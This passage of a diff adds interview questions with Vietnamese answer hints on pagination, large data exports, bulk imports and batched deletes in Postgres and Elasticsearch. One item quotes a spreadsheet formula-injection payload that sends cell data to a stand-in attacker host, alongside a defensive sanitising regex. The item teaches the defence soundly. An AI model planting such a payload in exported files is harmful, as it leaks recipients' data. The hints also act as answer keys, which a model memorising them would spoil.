+        return { items, hasNext: dir === "next" ? more : true, hasPrev: dir === "prev" ? more : c !== null };
+      }
+      ```
+    followUp: Users land on a deep link to a specific order and want to see the page around it. How do you build that page?
+    redFlags:
+      - "Keeps a server-side stack of previous cursors per session"
+      - "Forgets to reverse the rows for the previous page"
+    tags: [pagination, keyset, bidirectional]
+  - id: scenario-data-010
+    level: hard
+    type: gotcha
+    q: >-
+      You need keyset pagination sorted by `shipped_at DESC NULLS LAST, id DESC`, where `shipped_at` is NULL for unshipped orders.
+      Why does the naive cursor break, and how do you handle it?
+    hint: |-
+      `NULL` so sánh với bất kỳ giá trị nào ra `NULL` (không phải true) → `(shipped_at, id) < ($1, $2)` **loại bỏ toàn bộ row NULL**, và cursor nằm ở một row NULL thì điều kiện luôn NULL → trang rỗng.
+      Cách 1 — hai pha: đi hết phần non-NULL bằng keyset, khi cạn thì chuyển sang pha `shipped_at IS NULL AND id < $lastId`; cursor mang cờ `phase`.
+      Cách 2 — sentinel: sort theo `COALESCE(shipped_at, '-infinity')` và tạo **expression index** trên đúng biểu thức đó (query phải viết y hệt).
+      Index cho cách 1: `(shipped_at DESC NULLS LAST, id DESC)`. Mặc định Postgres: NULL đứng **cuối khi ASC, đầu khi DESC** — nên phải ghi rõ `NULLS LAST`.
+    example: |-
+      ```sql
+      -- phase 1 (non-null)
+      WHERE shipped_at IS NOT NULL AND (shipped_at, id) < ($1, $2)
+      ORDER BY shipped_at DESC, id DESC LIMIT $3;
+      -- phase 2 (nulls), khi phase 1 hết
+      WHERE shipped_at IS NULL AND id < $2
+      ORDER BY id DESC LIMIT $3;
+      ```
+    followUp: The sort column is `price`, which the customer can edit. What happens to an open cursor when the row it points to changes?
+    redFlags:
+      - "Does not know NULL comparisons return NULL"
+    tags: [pagination, keyset, nulls]
+  - id: scenario-data-011
+    level: hard
+    type: scenario
+    q: >-
+      Your product search on Elasticsearch throws "Result window is too large" when users go past page 500 with 20 hits per page,
+      and a data team wants to page through all 40M documents. What do you do for each?
+    hint: |-
+      `from + size` bị giới hạn bởi `index.max_result_window` (mặc định **10.000**) vì mỗi shard phải lấy `from + size` hit rồi coordinating node sort gộp → chi phí nhân với số shard. Tăng limit chỉ dời vấn đề.
+      UI: giới hạn page (Google cũng chỉ ~vài chục trang), hoặc `search_after` với sort có tie-breaker unique (`_score`, `id`). Muốn kết quả **ổn định** giữa các trang dù index đang refresh → mở **PIT (point in time)** và gửi `pit.id` mỗi request.
+      Data team (40M docs): không phải việc của search API → `search_after` + PIT theo batch 1–10k, hoặc sliced PIT song song; tốt hơn nữa là export từ **source of truth** (DB/data lake) thay vì cluster search.
+      `scroll` API còn dùng được nhưng ES khuyến nghị `search_after` + PIT cho deep paging.
+    example: |-
+      ```ts
+      const pit = await es.openPointInTime({ index: "products", keep_alive: "2m" });
+      let after: unknown[] | undefined;
+      for (;;) {
+        const r = await es.search({
+          size: 5000, pit: { id: pit.id, keep_alive: "2m" },
+          sort: [{ updated_at: "desc" }, { product_id: "asc" }],
+          ...(after && { search_after: after }),
+        });
+        if (r.hits.hits.length === 0) break;
+        await sink(r.hits.hits);
+        after = r.hits.hits.at(-1)!.sort;
+      }
+      await es.closePointInTime({ id: pit.id });
+      ```
+    followUp: What does an open PIT cost the cluster, and what happens if the data team forgets to close it?
+    redFlags:
+      - "Raises max_result_window to 10 million"
+    tags: [pagination, elasticsearch, search-after]
+    verify: true
+  - id: scenario-data-012
+    level: easy
+    type: scenario
+    q: >-
+      The "Export orders to CSV" button works for small tenants but returns 504 for large ones, and sometimes the API pod restarts with OOMKilled.
+      What is going on?
+    hint: |-
+      Hai lỗi khác nhau: (1) **504**: request đồng bộ chạy lâu hơn idle timeout của LB/gateway (ALB mặc định 60s, API Gateway REST 29s — verify) → client nhận 504 nhưng server vẫn chạy tiếp, user bấm lại → chạy 2 lần; (2) **OOMKilled**: code load toàn bộ row vào mảng rồi build string → memory ~ vài lần kích thước data (object JS + string).
+      Fix: chuyển sang **async job** (`POST /exports` → 202 + job id → worker → S3 → presigned URL) và **stream** từ DB ra file, không buffer. Giới hạn số export chạy đồng thời.
+      Con số: 2M row × 300 byte ≈ 600 MB CSV; dạng object JS có thể gấp 3–10 lần → vượt limit pod 1 GiB (verify).
+    followUp: Why is "just increase the LB timeout to 10 minutes" a bad fix?
+    redFlags:
+      - "Increases the pod memory limit and timeout and calls it done"
+    tags: [export, async, oom]
+    verify: true
+  - id: scenario-data-013
+    level: medium
+    type: debug
+    q: >-
+      This export worker runs in the background already, but memory still grows to 3 GB on big tenants. Find the problems and rewrite it.
+    hint: |-
+      Lỗi: (1) `findMany()` không giới hạn → toàn bộ kết quả trong RAM; (2) `map().join()` tạo thêm một string khổng lồ (V8 giới hạn độ dài string ~512 MB–1 GB — verify, nên có thể lỗi `Invalid string length`); (3) `PutObject` với Body là cả buffer; (4) CSV tự ghép `,` không escape dấu phẩy/ngoặc kép/xuống dòng.
+      Fix: đọc theo **stream** (cursor hoặc `COPY TO STDOUT`), transform từng row bằng thư viện CSV, gzip, upload bằng **multipart** (`@aws-sdk/lib-storage` `Upload` nhận stream), nối bằng `pipeline()` để có backpressure và dọn dẹp khi lỗi.
+      Memory sau fix: vài chục MB, gần như không đổi theo số row (≈ `queueSize × partSize` của upload + buffer của stream).
+    example: |-
+      ```ts
+      // BUG
+      const rows = await prisma.order.findMany({ where: { tenantId } });
+      const csv = ["id,total,email", ...rows.map(r => `${r.id},${r.total},${r.email}`)].join("\n");
+      await s3.send(new PutObjectCommand({ Bucket, Key, Body: csv }));
+
+      // FIX
+      import { pipeline } from "node:stream/promises";
+      import { createGzip } from "node:zlib";
+      import { PassThrough } from "node:stream";
+      import QueryStream from "pg-query-stream";
+      import { stringify } from "csv-stringify";
+      import { Upload } from "@aws-sdk/lib-storage";
+
+      const client = await pool.connect();
+      try {
+        const rows = client.query(new QueryStream(
+          "SELECT id, total, email FROM orders WHERE tenant_id = $1 ORDER BY id", [tenantId], { batchSize: 1000 }));
+        const body = new PassThrough();
+        const upload = new Upload({ client: s3, params: { Bucket, Key, Body: body, ContentEncoding: "gzip" },
+                                    partSize: 8 * 1024 * 1024, queueSize: 4 });
+        await Promise.all([
+          pipeline(rows, stringify({ header: true, columns: ["id", "total", "email"] }), createGzip(), body),
+          upload.done(),
+        ]);
+      } finally {
+        client.release();
+      }
+      ```
+    followUp: If `upload.done()` rejects halfway, what happens to the DB cursor and the half-uploaded object?
+    redFlags:
+      - "Fixes it with `--max-old-space-size=8192`"
+      - "Paginates with OFFSET inside the worker"
+    tags: [export, streams, backpressure, debug]
+    verify: true
+  - id: scenario-data-014
+    level: hard
+    type: debug
+    q: >-
+      This streaming export still leaks memory under load, even though it never loads all rows at once. Why?
+    hint: |-
+      `on("data")` + `gzip.write()` **bỏ qua giá trị trả về** của `write()`. Khi S3 chậm hơn DB, gzip buffer đầy, `write()` trả `false` nhưng code vẫn ghi tiếp → dữ liệu dồn trong `writableBuffer` → memory tăng không giới hạn. Đó là **mất backpressure**.
+      Thêm: không có xử lý lỗi → một stream lỗi thì các stream khác treo, connection DB không được release.
+      Fix ưu tiên: `await pipeline(src, transform, gzip, dest)` (tự pause/resume theo `highWaterMark`, tự destroy tất cả khi lỗi). Nếu phải ghi tay: `if (!w.write(chunk)) await once(w, "drain")`. Có thể dùng `for await (const row of src)` với writer có drain.
+    example: |-
+      ```ts
+      // BUG
+      dbStream.on("data", (row) => gzip.write(toCsvLine(row)));
+      dbStream.on("end", () => gzip.end());
+      gzip.pipe(uploadBody);
+
+      // FIX
+      import { pipeline } from "node:stream/promises";
+      import { Transform } from "node:stream";
+      const toCsv = new Transform({
+        writableObjectMode: true,
+        transform(row, _enc, cb) { cb(null, toCsvLine(row)); },
+      });
+      await pipeline(dbStream, toCsv, createGzip(), uploadBody);
+      ```
+    followUp: What is `highWaterMark` for an object-mode stream versus a byte stream, and how would you tune it for this job?
+    redFlags:
+      - "Says Node streams handle backpressure automatically no matter how you use them"
+    tags: [export, streams, backpressure, nodejs]
+  - id: scenario-data-015
+    level: medium
+    type: compare
+    q: >-
+      For a 20M-row export from Postgres in Node, compare three ways to read the data: a server-side cursor stream, keyset batches,
+      and `COPY (SELECT ...) TO STDOUT`.
+    hint: |-
+      - **Cursor stream** (`pg-query-stream`, `DECLARE CURSOR` bên dưới): một query, một snapshot nhất quán; nhưng giữ **một connection và một transaction** suốt job → giữ xmin (vacuum không dọn), và không resume được nếu worker chết.
+      - **Keyset batches** (`WHERE id > $last ORDER BY id LIMIT 10000`): mỗi batch transaction ngắn, **resume** từ checkpoint, trả connection giữa các batch; nhưng không có snapshot chung (row đổi giữa các batch).
+      - **`COPY ... TO STDOUT`** (`pg-copy-streams`): nhanh nhất, server tự format CSV (escape chuẩn), app chỉ chuyển byte; nhưng khó transform từng row (mask PII, formula guard), vẫn là một statement dài.
+      Chọn: file thô cần nhanh → COPY; cần transform + resume → keyset; cần snapshot tuyệt đối, job ngắn → cursor. Cả ba nên chạy trên **replica**.
+    followUp: You chose COPY but must mask emails for some roles. Where do you do the masking?
+    tags: [export, postgres, streams]
+  - id: scenario-data-016
+    level: easy
+    type: gotcha
+    q: >-
+      A developer copied `COPY orders TO '/tmp/orders.csv' CSV HEADER;` from a blog into the export service. It fails on RDS, and on a
+      self-hosted DB the file never shows up in the app container. Why?
+    hint: |-
+      `COPY ... TO 'file'` được **server Postgres** thực thi → file ghi trên **filesystem của máy DB**, không phải máy app. Cần superuser hoặc role `pg_write_server_files`. Managed DB (RDS/Aurora, Cloud SQL) không cho truy cập filesystem đó.
+      Từ app dùng **`COPY (SELECT ...) TO STDOUT WITH (FORMAT csv, HEADER)`** và đọc stream qua `pg-copy-streams`; hoặc `\copy` của psql (chạy client-side). Trên RDS còn có extension `aws_s3.query_export_to_s3` ghi thẳng ra S3 (verify quyền IAM).
+      Tương tự MySQL: `SELECT ... INTO OUTFILE` cũng ghi trên máy DB (và bị `secure_file_priv` giới hạn).
+    example: |-
+      ```ts
+      import { to as copyTo } from "pg-copy-streams";
+      const client = await pool.connect();
+      try {
+        const src = client.query(copyTo(
+          "COPY (SELECT id, total, created_at FROM orders WHERE tenant_id = 42) TO STDOUT WITH (FORMAT csv, HEADER)"));
+        await pipeline(src, createGzip(), uploadBody);
+      } finally { client.release(); }
+      ```
+    followUp: COPY doesn't accept bind parameters for the inner query. How do you pass the tenant id safely?
+    redFlags:
+      - "Suggests granting superuser to the app role"
+    tags: [export, copy, postgres]
+    verify: true
+  - id: scenario-data-017
+    level: hard
+    type: scenario
+    q: >-
+      Finance complains the monthly export's row count and grand total don't match the dashboard. The export reads 30M rows in keyset batches
+      over 90 minutes while orders keep changing. How do you make it consistent, and what does that cost?
+    hint: |-
+      Nguyên nhân: mỗi batch là một snapshot khác nhau → row được update/move giữa các batch có thể bị đếm 2 lần hoặc sót; dashboard lại đọc một thời điểm khác.
+      Lựa chọn: (1) chạy cả export trong **một transaction `REPEATABLE READ` (read only)** → một snapshot; song song hoá bằng `pg_export_snapshot()` + `SET TRANSACTION SNAPSHOT` ở các worker khác (giống `pg_dump -j`); (2) **định nghĩa lại "consistent"** theo business: cắt theo `as_of` timestamp và dữ liệu bất biến (ledger append-only, `created_at < cutoff`); (3) export từ **snapshot DB/replica tách riêng** (restore từ backup, Aurora clone).
+      Chi phí transaction dài: trên primary giữ **xmin** → vacuum không dọn dead tuple toàn cluster suốt 90 phút → bloat; trên replica bị hủy bởi "conflict with recovery" sau `max_standby_streaming_delay` (mặc định 30s) trừ khi bật `hot_standby_feedback` — mà bật thì bloat lại đẩy về primary.
+      Thực tế: ledger/`as_of` + replica chuyên cho export, hoặc clone.
+    example: |-
+      ```sql
+      -- coordinator
+      BEGIN ISOLATION LEVEL REPEATABLE READ READ ONLY;
+      SELECT pg_export_snapshot();          -- '00000003-0000001B-1'
+      -- worker N (while coordinator txn stays open)
+      BEGIN ISOLATION LEVEL REPEATABLE READ READ ONLY;
+      SET TRANSACTION SNAPSHOT '00000003-0000001B-1';
+      COPY (SELECT ... WHERE id BETWEEN 1 AND 10000000) TO STDOUT WITH (FORMAT csv);
+      ```
+    followUp: Your replica has `hot_standby_feedback = off` and the export keeps failing after 30 seconds. Walk through your options.
+    redFlags:
+      - "Uses SERIALIZABLE and assumes that removes all cost"
+      - "Never mentions vacuum or the replica conflict"
+    tags: [export, snapshot, mvcc, replica]
+    verify: true
+  - id: scenario-data-018
+    level: medium
+    type: gotcha
+    q: >-
+      Sales wants the 2M-row export as an Excel file, not CSV. What limits and pitfalls do you raise, and how do you implement it if they insist?
+    hint: |-
+      Giới hạn cứng: **1.048.576 row × 16.384 cột mỗi sheet** → 2M row phải chia nhiều sheet hoặc nhiều file. Mở file 2M row trong Excel cũng rất chậm → hỏi lại mục đích thật (pivot? import vào tool khác?).
+      Kỹ thuật: xlsx là zip các XML → thư viện ghi kiểu "build cả workbook trong RAM" sẽ OOM. Dùng **streaming writer** (exceljs `stream.xlsx.WorkbookWriter`, `commit()` từng row) ghi thẳng vào stream upload.
+      Pitfall khác: Excel tự đổi kiểu (mã `00123` → `123`, số dài → số mũ, chuỗi giống ngày → ngày), timezone của datetime, encoding CSV (thêm BOM UTF-8 để Excel đọc đúng tiếng Việt), và **formula injection**.
+    example: |-
+      ```ts
+      import ExcelJS from "exceljs";
+      const wb = new ExcelJS.stream.xlsx.WorkbookWriter({ stream: uploadBody, useSharedStrings: false });
+      let ws = wb.addWorksheet("orders-1"); let n = 0; let sheet = 1;
+      for await (const row of rows) {
+        if (++n > 1_048_575) { await ws.commit(); ws = wb.addWorksheet(`orders-${++sheet}`); n = 1; }
+        ws.addRow([row.id, row.total, safeCell(row.note)]).commit();
+      }
+      await ws.commit(); await wb.commit();
+      ```
+    followUp: "Why does `useSharedStrings: true` change the memory profile of a streaming xlsx writer?"
+    tags: [export, excel]
+    verify: true
+  - id: scenario-data-019
+    level: medium
+    type: gotcha
+    q: >-
+      A security review flags your CSV export: a customer set their company name to `=HYPERLINK("http://evil.example/?d="&A1,"Click")`.
+      What is the risk and what exactly do you change?
+    hint: |-
+      **CSV / formula injection**: khi người khác mở file bằng Excel/Sheets, ô bắt đầu bằng ký tự công thức được **thực thi** → lộ dữ liệu qua link, hoặc (bản cũ) DDE chạy lệnh. Dữ liệu do user nhập nằm trong file do *hệ thống bạn* phát hành.
+      Fix (OWASP): với mọi ô chứa dữ liệu không tin cậy bắt đầu bằng `=`, `+`, `-`, `@`, tab (`0x09`), CR (`0x0D`) → **prefix `'`**; đồng thời escape CSV chuẩn (bọc `"`, nhân đôi `"` bên trong). Làm ở **lớp export**, không sửa dữ liệu trong DB.
+      Trade-off: số âm hợp lệ `-12.5` cũng bị prefix → chỉ áp dụng cho cột text, cột số giữ nguyên kiểu.
+    example: |-
+      ```ts
+      const DANGER = /^[=+\-@\t\r]/;
+      export const safeCell = (v: unknown) =>
+        typeof v === "string" && DANGER.test(v) ? `'${v}` : v;
+      // then let the CSV library quote/escape:  "'=HYPERLINK(""http://..."")"
+      ```
+    followUp: The same data is also exported as JSON through an API. Does this apply there too?
+    redFlags:
+      - "Says it's the user's problem because Excel shows a warning"
+    tags: [export, security, csv-injection]
+  - id: scenario-data-020
+    level: hard
+    type: scenario
+    q: >-
+      A 40M-row export worker is killed by a deploy at 70% progress. The queue redelivers the job and it starts from zero; meanwhile the user
+      clicked Export twice. Redesign the job so this is cheap and correct.
+    hint: |-
+      (1) **Idempotent tạo job**: `export_jobs` có unique `(tenant_id, idempotency_key)` hoặc hash `(tenant, filter, as_of)` → bấm 2 lần trả cùng job. (2) **Checkpoint**: sau mỗi part, lưu `last_key`, `part_number`, `ETag` của S3 multipart → khi redeliver, `ListParts` + tiếp tục từ `last_key` (cần keyset batches, không phải một cursor dài). (3) **Lease**: worker giữ lease có heartbeat; hết lease thì worker khác nhận, tránh 2 worker cùng chạy. (4) **Graceful shutdown**: SIGTERM → dừng nhận batch mới, flush part hiện tại, lưu checkpoint.
+      Dọn dẹp: S3 lifecycle rule `AbortIncompleteMultipartUpload` (vd 1 ngày) để part rác không tính tiền mãi; file kết quả hết hạn sau N ngày; presigned URL ngắn (15 phút) và cấp lại khi user bấm download.
+      Con số S3: part ≥ 5 MiB (trừ part cuối), tối đa 10.000 part → part 8 MiB giới hạn ~80 GB (verify).
+    example: |-
+      ```sql
+      CREATE TABLE export_jobs (
+        id uuid PRIMARY KEY, tenant_id bigint NOT NULL, idempotency_key text NOT NULL,
+        status text NOT NULL, as_of timestamptz NOT NULL,
+        s3_upload_id text, last_key bigint, parts jsonb NOT NULL DEFAULT '[]',
+        rows_done bigint NOT NULL DEFAULT 0, lease_until timestamptz,
+        UNIQUE (tenant_id, idempotency_key)
+      );
+      ```
+    followUp: Gzip is a single stream. How do you resume a gzip file from the middle?
+    redFlags:
+      - "Relies on the queue's exactly-once delivery"
+      - "Stores the whole partial file on the worker's local disk"
+    tags: [export, idempotency, resumable, s3]
+    verify: true
+  - id: scenario-data-021
+    level: hard
+    type: scenario
+    q: >-
+      Every Monday at 9am, 50 tenants trigger large exports at once. Primary CPU hits 95%, checkout latency triples, and replica lag reaches 40 seconds.
+      What do you do now, and what do you change for next Monday?
+    hint: |-
+      Ngay: pause/giảm concurrency worker export (feature flag), kill query export đang chạy trên primary (`pg_cancel_backend`), checkout trở lại bình thường là ưu tiên số 1.
+      Tuần sau: (1) export đọc từ **replica riêng cho batch/reporting** (không dùng chung replica phục vụ read của user); (2) **global concurrency + per-tenant limit** (vd tối đa 4 job toàn hệ, 1 job/tenant) và fair queue để tenant to không chiếm hết; (3) `statement_timeout`/`work_mem` riêng cho role export; (4) query export có index phù hợp, keyset batch có sleep; (5) cache kết quả: cùng filter + `as_of` trong 1 giờ → trả file cũ; (6) lịch chạy trước: export định kỳ vào giờ thấp điểm.
+      Replica lag 40s là do replica phải replay trong khi đang chạy query nặng (I/O cạnh tranh) → tách replica, theo dõi `replay_lag`.
+    followUp: How would you implement a per-tenant concurrency limit with BullMQ or SQS, where there is no built-in per-group limit?
+    redFlags:
+      - "Scales the primary vertically as the only fix"
+    tags: [export, multi-tenant, concurrency, replica]
+  - id: scenario-data-022
+    level: senior
+    type: design
+    q: >-
+      Design the export platform for a multi-tenant SaaS: 10,000 exports a day, most under 10k rows, a few up to 50M rows, formats CSV and XLSX,
+      and a requirement that exports reflect a single point in time.
+    hint: |-
+      Tách theo kích thước: dự đoán số row (estimate từ `EXPLAIN`) → **nhỏ**: stream sync ngay trong request (vài giây) hoặc job nhanh; **lớn**: lane riêng, worker riêng, replica/clone riêng.
+      Thành phần: API (`POST /exports` idempotent, 202) → `export_jobs` table (state machine queued/running/succeeded/failed/cancelled/expired) → queue có priority + per-tenant quota → worker stateless streaming → S3 (prefix theo tenant, SSE-KMS, lifecycle) → notify (email/webhook/SSE) → presigned URL ngắn.
+      Point in time: định nghĩa `as_of`; với dữ liệu append-only thì `created_at <= as_of` là đủ; với dữ liệu mutable dùng snapshot (REPEATABLE READ trên replica chuyên dụng, hoặc DB clone/snapshot cho job khổng lồ) hoặc lấy từ warehouse/CDC đã có versioning.
+      Vận hành: metric rows/s, time-to-first-byte, queue wait theo tenant, lỗi theo format; audit ai export gì (PII); giới hạn XLSX (chuyển CSV khi > 1M row).
+      Trade-off chính: snapshot chính xác vs chi phí giữ snapshot; chung hạ tầng vs cô lập tenant lớn.
+    followUp: A regulator asks you to prove which user downloaded which customer's data last March. What did you need to build in advance?
+    tags: [export, system-design, multi-tenant]
+  - id: scenario-data-023
+    level: medium
+    type: scenario
+    q: >-
+      A nightly job imports a 1M-row supplier CSV with one `INSERT` per row through the ORM. It takes 40 minutes. Get it under 2 minutes.
+    hint: |-
+      Nguyên nhân: 1M round-trip + 1M transaction commit (mỗi commit chờ WAL fsync) + ORM overhead. 40 phút ≈ 2,4 ms/row.
+      Fix theo thứ tự: (1) **stream parse** file (không `readFileSync`); (2) **`COPY staging FROM STDIN`** vào bảng staging (`UNLOGGED` hoặc temp, không index) — nhanh hơn INSERT nhiều lần; (3) validate bằng SQL trên staging; (4) merge sang bảng thật bằng `INSERT ... SELECT ... ON CONFLICT (sku) DO UPDATE` theo batch 10–50k row để transaction không quá dài; (5) `ANALYZE` bảng đích sau khi load.
+      Nếu không dùng COPY được: multi-row INSERT 1.000 row/statement trong transaction vài chục nghìn row.
+      Con số: COPY thường đạt hàng trăm nghìn row/giây trên row hẹp (verify — phụ thuộc index, trigger, disk).
+    example: |-
+      ```ts
+      import { from as copyFrom } from "pg-copy-streams";
+      const client = await pool.connect();
+      try {
+        await client.query("CREATE TEMP TABLE staging (LIKE supplier_items_raw) ON COMMIT DROP");
+        await client.query("BEGIN");
+        await pipeline(fs.createReadStream(path), client.query(copyFrom(
+          "COPY staging (sku, name, price, qty) FROM STDIN WITH (FORMAT csv, HEADER)")));
+        await client.query(`
+          INSERT INTO supplier_items (sku, name, price, qty)
+          SELECT sku, name, price::numeric, qty::int FROM staging
+          ON CONFLICT (sku) DO UPDATE SET name = EXCLUDED.name, price = EXCLUDED.price, qty = EXCLUDED.qty
+          WHERE (supplier_items.name, supplier_items.price, supplier_items.qty)
+                IS DISTINCT FROM (EXCLUDED.name, EXCLUDED.price, EXCLUDED.qty)`);
+        await client.query("COMMIT");
+      } finally { client.release(); }
+      ```
+    followUp: Why does the `WHERE ... IS DISTINCT FROM` clause on the upsert matter for WAL, bloat and replicas?
+    redFlags:
+      - "Uses Promise.all on 1M inserts"
+    tags: [import, copy, bulk-load]
+    verify: true
+  - id: scenario-data-024
+    level: hard
+    type: design
+    q: >-
+      Customers upload CSVs of up to 1M rows. Some rows are invalid, the upload can be retried, and the customer needs to know exactly which rows failed.
+      Design the import flow.
+    hint: |-
+      Upload: client đẩy thẳng lên S3 bằng presigned URL → event → job `imports(id, tenant_id, file_sha256, status, counts)` với **unique `(tenant_id, file_sha256)`** (hoặc idempotency key) → upload lại cùng file = cùng job.
+      Xử lý: stream parse (xử lý encoding, BOM, delimiter), load thô vào staging kèm `line_no` → validate bằng SQL/code theo batch (kiểu, required, FK tồn tại, trùng trong file) → ghi lỗi vào `import_errors(import_id, line_no, column, code, message)`.
+      Chính sách: **all-or-nothing** (tài chính) hoặc **partial accept** (catalog) — phải chọn rõ và hiển thị. Merge bằng upsert theo business key để chạy lại không tạo trùng.
+      Output: counts (inserted/updated/skipped/failed), error report CSV tải về, preview 20 lỗi đầu trên UI; giới hạn lỗi (dừng sớm nếu > 10% lỗi — thường là sai template).
+    followUp: Two imports for the same tenant run at the same time and touch the same SKUs. What do you do?
+    redFlags:
+      - "Validates the whole file in memory before inserting anything"
+      - "Returns only 'import failed' without row numbers"
+    tags: [import, idempotency, validation]
+  - id: scenario-data-025
+    level: hard
+    type: debug
+    q: >-
+      To speed up an import, a developer builds one multi-row INSERT for 10,000 rows with 8 columns. It crashes in production but worked in tests with 500 rows. Why?
+    hint: |-
+      Postgres wire protocol dùng số nguyên 16-bit cho số bind parameter → tối đa **65.535 parameter mỗi statement**. 10.000 × 8 = 80.000 → lỗi (driver báo kiểu "bind message has N parameter formats…" hoặc tương tự). SQL Server giới hạn **2.100** parameter.
+      Fix: (1) batch size = `floor(65535 / columns)` và nhỏ hơn nhiều cho an toàn (1.000 row); (2) dùng **array parameters + `unnest`** → chỉ 8 parameter cho bất kỳ số row nào; (3) tốt nhất cho số lượng lớn: `COPY FROM STDIN`.
+      Bài học: test với kích thước production (property/load test cho batch size).
+    example: |-
+      ```ts
+      // BUG: 10_000 rows × 8 cols = 80_000 parameters
+      await db.insertInto("items").values(rows).execute();
+
+      // FIX: 8 parameters regardless of row count
+      await sql`
+        INSERT INTO items (sku, name, price, qty, a, b, c, d)
+        SELECT * FROM unnest(
+          ${skus}::text[], ${names}::text[], ${prices}::numeric[], ${qtys}::int[],
+          ${as}::text[], ${bs}::text[], ${cs}::text[], ${ds}::text[])
+        ON CONFLICT (sku) DO NOTHING`;
+      ```
+    followUp: What else goes wrong with very large single statements even under the parameter limit?
+    redFlags:
+      - "Blames the ORM and switches ORMs"
+    tags: [import, postgres, sql-server, debug]
+    verify: true
+  - id: scenario-data-026
+    level: easy
+    type: gotcha
+    q: >-
+      Your runbook says `DELETE FROM orders WHERE created_at < '2023-01-01' LIMIT 10000;` and is labelled "MySQL / PostgreSQL". What happens on Postgres,
+      and what do you write instead?
+    hint: |-
+      PostgreSQL **không hỗ trợ `LIMIT` trong `DELETE`** (cũng không có `ORDER BY` trong DELETE) → syntax error. MySQL hỗ trợ `DELETE ... ORDER BY ... LIMIT n`; SQL Server dùng `DELETE TOP (n) FROM ...`.
+      Postgres: chọn khoá trong subquery có `LIMIT`, rồi xoá theo khoá — PK là tốt nhất; `ctid` (vị trí vật lý) cũng dùng được trong một statement nhưng không ổn định qua các statement (UPDATE/VACUUM FULL đổi ctid).
+      Lặp cho tới khi `rowCount = 0`, mỗi vòng một transaction, có index trên `created_at`.
+    example: |-
+      ```sql
+      -- PostgreSQL
+      DELETE FROM orders
+      WHERE id IN (
+        SELECT id FROM orders
+        WHERE created_at < '2023-01-01'
+        ORDER BY id
+        LIMIT 10000
+      );
+      -- SQL Server
+      DELETE TOP (10000) FROM orders WHERE created_at < '2023-01-01';
+      -- MySQL
+      DELETE FROM orders WHERE created_at < '2023-01-01' ORDER BY id LIMIT 10000;
+      ```
+    followUp: Why add `ORDER BY id` in the subquery — does it matter for correctness, locking or performance?
+    redFlags:
+      - "Assumes every SQL dialect supports DELETE ... LIMIT"
+    tags: [delete, batch, postgres, sql-server, mysql]
+  - id: scenario-data-027
+    level: medium
+    type: scenario
+    q: >-
+      You must delete 10M rows (orders older than 3 years) from a 500M-row `orders` table on a live Postgres primary with replicas.
+      Walk me through the plan.
+    hint: |-
+      Làm rõ: 10M là 2% bảng → batched delete hợp lý (nếu là 80% → copy-keepers/partition). Có FK con không (`order_items`, `payments`)? Có trigger/audit? Có cần backup/archive trước không?
+      Trước: archive ra S3/bảng khác nếu cần; index trên predicate (`created_at`) **và** trên FK cột ở bảng con; ước lượng WAL (~ kích thước row + index entry mỗi row).
+      Chạy: script lặp batch 1k–10k row theo PK, mỗi batch một transaction ngắn (< ~1s), `sleep` 100–500 ms, **throttle theo replica lag** và CPU, checkpoint để resume, chạy ngoài giờ cao điểm, `lock_timeout` ngắn.
+      Sau: `VACUUM (ANALYZE) orders` (space tái sử dụng nội bộ, không trả OS), theo dõi bloat index; lần sau: partition theo tháng để retention là `DETACH` + `DROP`.
+      Con số: 10M / 5k = 2.000 batch × (200 ms + 300 ms sleep) ≈ 17 phút (verify theo hệ thống).
+    followUp: Halfway through, autovacuum on `orders` starts and your batches get slower. Do you stop it?
+    redFlags:
+      - "Single DELETE in one transaction 'at night'"
+      - "Forgets child tables and cascades"
+    tags: [delete, batch, operations]
+    verify: true
+  - id: scenario-data-028
+    level: hard
+    type: debug
+    q: >-
+      The batched delete below should take minutes, but each batch of 5,000 takes 40 seconds and CPU is high. `orders(created_at)` is indexed.
+      What is wrong?
+    hint: |-
+      `order_items.order_id` references `orders(id) ON DELETE CASCADE` nhưng **không có index trên `order_items.order_id`**. Postgres **không tự tạo index cho cột FK** (chỉ cho PK/unique phía được tham chiếu). Mỗi row orders bị xoá → trigger FK phải tìm row con → **seq scan `order_items`** cho từng row (hoặc từng batch) → cực chậm. Tương tự với `ON DELETE RESTRICT/NO ACTION`: vẫn phải kiểm tra.
+      Cách nhận ra: `EXPLAIN (ANALYZE)` của DELETE hiện dòng `Trigger for constraint order_items_order_id_fkey: time=... calls=5000`.
+      Fix: `CREATE INDEX CONCURRENTLY ON order_items (order_id)`; xoá **bảng con trước** theo batch rồi bảng cha; kiểm tra thêm trigger audit ghi 1 row/row bị xoá (có thể tạm tắt cho job, có chủ đích và ghi log).
+    example: |-
+      ```sql
+      EXPLAIN (ANALYZE) DELETE FROM orders
+      WHERE id IN (SELECT id FROM orders WHERE created_at < '2023-01-01' ORDER BY id LIMIT 5000);
+      --  Delete on orders (actual time=412.3..412.3 rows=0)
+      --  ...
+      --  Trigger for constraint order_items_order_id_fkey: time=39871.2 calls=5000
+      --  Trigger audit_orders_delete: time=911.4 calls=5000
+      ```
+    followUp: SQL Server behaves the same way here. Is that true, and what does it do about FK indexes?
+    redFlags:
+      - "Blames the batch size and lowers it to 500"
+    tags: [delete, foreign-key, index, debug]
+  - id: scenario-data-029
+    level: hard
+    type: scenario
+    q: >-
+      While your batched delete runs, replica lag climbs to 30 seconds, users see stale data after writes, and the primary's `pg_wal` directory keeps growing.
+      What do you check and what do you do?
+    hint: |-
+      Ngay: **pause job** (script phải có kill switch/pause flag). Delete tạo WAL cho từng tuple + full-page image sau checkpoint → replica không replay kịp.
+      Kiểm tra: `pg_stat_replication` (`write_lag`, `flush_lag`, `replay_lag`), `pg_replication_slots` (slot nào `active = false` hoặc `restart_lsn` tụt lại — một slot CDC chết giữ WAL mãi → đầy disk), checkpoint frequency, I/O replica.
+      Sửa job: throttle **theo lag** (tự sleep khi `replay_lag > 5s`), batch nhỏ hơn, chạy lúc thấp điểm, nếu WAL là vấn đề thì cân nhắc `wal_compression`.
+      Stale read: app đang đọc sau-khi-ghi từ replica → route read-after-write về primary trong vài giây.
+      Dài hạn: partition để `DROP` (gần như không sinh WAL theo row).
+    example: |-
+      ```ts
+      async function waitForReplicas(maxLagMs = 5000) {
+        for (;;) {
+          const { rows } = await primary.query(
+            "SELECT coalesce(max(extract(epoch FROM replay_lag)) * 1000, 0) AS lag_ms FROM pg_stat_replication");
+          if (Number(rows[0].lag_ms) < maxLagMs) return;
+          await sleep(2000);
+        }
+      }
+      ```
+    followUp: "`replay_lag` is NULL on an idle system. Why, and how does that affect your throttle?"
+    redFlags:
+      - "Only watches CPU on the primary"
